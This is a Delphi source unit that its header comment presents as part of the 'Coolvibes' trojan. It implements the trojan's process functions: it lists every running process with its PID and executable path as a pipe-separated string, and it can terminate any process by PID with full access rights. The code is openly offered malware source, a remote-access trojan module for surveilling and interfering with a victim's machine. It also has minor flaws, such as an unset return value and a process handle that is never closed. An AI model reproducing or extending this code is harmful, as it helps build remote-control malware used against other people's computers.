{Unit perteneciente al troyano Coolvibes que contiene todas las funciones
relaccionadas con los procesos del sistema}
unit UnitProcess;

interface

uses
  Windows,
  SysUtils,
  TLhelp32,
  PsAPI;

function GetProc(): string;
function TerminarProceso(PID: string): Boolean;
function RutaProcesos(PID: DWORD): string;

implementation

//Procesos +pid separados por |

function GetProc(): string;
var
  Proceso: TProcessEntry32;
  ProcessHandle: THandle;
  HayOtroProceso: Boolean;
begin
  Proceso.dwSize := SizeOf(TProcessEntry32);
  ProcessHandle := CreateToolHelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if Process32First(ProcessHandle, Proceso) then //Si encuentra el primer proceso
    begin
      Result := string(Proceso.szExeFile) + '|' + IntToStr(Proceso.th32ProcessID) + '|' +
        string(RutaProcesos(Proceso.th32ProcessID)) + '|';
      repeat
        HayOtroProceso := Process32Next(ProcessHandle, Proceso);
        if HayOtroProceso then
          Result := Result + string(proceso.szExeFile) + '|' +
            IntToStr(Proceso.th32ProcessID) + '|' + string(RutaProcesos(Proceso.th32ProcessID)) + '|';
      until not HayOtroProceso; //Y esto se repite hasta que Process32Next retorne False
    end;
  CloseHandle(ProcessHandle);
end;

//Cierra el proceso con PID. Si sale bien, devuelve true

function TerminarProceso(PID: string): Boolean;
var
  ProcessHandle: THandle;
begin
  try
    ProcessHandle := OpenProcess(PROCESS_ALL_ACCESS, True, StrToInt64def(PID, -1));
    if TerminateProcess(ProcessHandle, 0) then
      Result := True
  except
    Result := False;
  end;
end;

//Obtenemos la ruta del ejecutable del proceso

function RutaProcesos(PID: DWORD): string;
var
  Handle: THandle;
begin
  Result := 'Desconocido';
  Handle := OpenProcess(PROCESS_QUERY_INFORMATION or PROCESS_VM_READ, False, PID);
  if Handle <> 0 then //Si el proceso existe
    try
      SetLength(Result, MAX_PATH);
      begin
        if GetModuleFileNameEx(Handle, 0, PChar(Result), MAX_PATH) > 0 then
          //Obtenemos path del proceso
          SetLength(Result, StrLen(PChar(Result)))
        else
          Result := 'Desconocido';
      end
    finally
      CloseHandle(Handle);
    end;
end;

end.
